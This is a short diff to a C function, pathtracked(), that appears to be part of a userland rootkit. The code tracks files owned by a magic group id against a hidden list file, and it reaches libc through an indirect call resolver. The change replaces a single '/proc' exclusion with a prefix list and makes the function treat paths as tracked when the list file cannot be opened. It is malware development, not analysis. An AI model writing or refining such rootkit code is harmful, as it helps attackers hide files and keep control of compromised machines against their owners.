@@ -12,9 +12,10 @@ int pathtracked(const char *pathname){
     // only track reg files that belong to us...
     if(!S_ISREG(assstat.st_mode) || assstat.st_gid != readgid())
         return 1;
-    
-    if(!strncmp("/proc", pathname, 5))
-        return 1;
+
+    for(int i = 0; i != sizeofarr(nopetrack); i++)
+        if(!strncmp(nopetrack[i], pathname, strlen(nopetrack[i])))
+            return 1;
 
     if(strstr(pathname, "swp")){ // ignore very temporary swp files
         char *pathnamedup = strdup(pathname),
@@ -37,7 +38,7 @@ int pathtracked(const char *pathname){
     memset(line, 0, sizeof(line));
     
     fp = call(CFOPEN, ASS_PATH, "r");
-    if(fp == NULL) return 1; // cant open the file..just say ok?
+    if(fp == NULL) return 0; // cant open the file..just say ok write it
     
     while(fgets(line, sizeof(line), fp) != NULL){
         if(!strcmp(line, pathname)){
